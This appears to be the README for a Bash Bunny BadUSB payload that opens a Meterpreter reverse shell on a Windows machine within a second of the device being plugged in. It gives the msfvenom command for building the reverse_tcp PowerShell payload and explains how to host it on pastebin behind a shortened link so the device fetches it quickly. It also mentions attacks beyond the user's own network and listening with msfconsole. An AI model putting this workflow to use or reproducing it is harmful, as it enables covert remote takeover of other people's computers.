# SingleSecondShell

Author: [@0xCoto](https://github.com/0xCoto)

Version: Version 1.0

## Description

Plug in the bash bunny, get a shell. Instantly.

The <1 Second ReverseShell Payload is going to run blazing fast on the Bash Bunny, and cannot work on any other BadUSB devices, such as the USB Rubber Ducky that quick. That is obviously the reason this Payload is dedicated and specifically developed for the Bash Bunny. Plug in, and before you know it, you've got a shell. How awesome is that?

## Configuration

#### Generating Payload
In order to generate your reverse_tcp Payload, you need to run the following command on your Kali machine (unless you have msfvenom installed on another OS): ```msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f psh-cmd –smallest```

Make sure to replace `YOUR_IP` with your local/public IP Address (depending on the type of attack you are looking to perform) and `YOUR_PORT` with the port that you've forwarded (if you are performing a public attack, outside your network).

When the payload is generated, remove everything up to `powershell.exe` and upload it to pastebin. Here's my example: http://pastebin.com/raw/DJbS5mTj

#### Shortening the URL
As you can see, we have a pretty long URL. So, in order to shorten the URL and reduce the amount of keystrokes, therefore attacking time, we are going to be using a URL shortening service, such as https://goo.gl/.

#### Completeing the script
That's it. Now just replace the `$u='YOUR_LINK'` with your new URL. For example: `$u='goo.gl/8ggZD1'`

Note: You do not need to include `http(s)://` in your URL, so you can go ahead and get rid of that too to reduce keystrokes and speedup the keystroke injection.

## Listening to Connections
Listening to connections is pretty straightforward, but I'm not going to cover it in detail in this tutorial. All you need to do is use a listener software, CLI or GUI, such as `msfconsole` or `Armitage`, both of which can be setup to work with each other very easily.

## Bash Bunny Status

| LED              | Status                                |
| ---------------- | ------------------------------------- |
| Red              | Failed to open script file            |
| Amber            | Script Running                        |
| Green            | Finished                              |
